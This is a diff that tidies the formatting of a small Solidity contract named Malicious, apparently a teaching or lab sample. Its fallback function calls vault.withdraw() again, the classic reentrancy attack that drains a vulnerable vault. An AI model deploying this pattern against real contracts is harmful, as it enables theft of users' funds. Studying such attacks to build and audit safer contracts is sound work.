@@ -1,10 +1,10 @@
+// SPDX-License-Identifier: MIT
 pragma solidity ^0.8.7;
-
 
 import "./IVault.sol";
 import "hardhat/console.sol";
-contract Malicious {
 
+contract Malicious {
     IVault public vault;
 
     constructor(IVault _vault) {
@@ -15,11 +15,11 @@ contract Malicious {
         vault.deposit{value: msg.value}();
     }
 
-    function withdrawFromVault() external  {
+    function withdrawFromVault() external {
         vault.withdraw();
     }
 
-    fallback() external payable{
+    fallback() external payable {
         vault.withdraw();
     }
 }
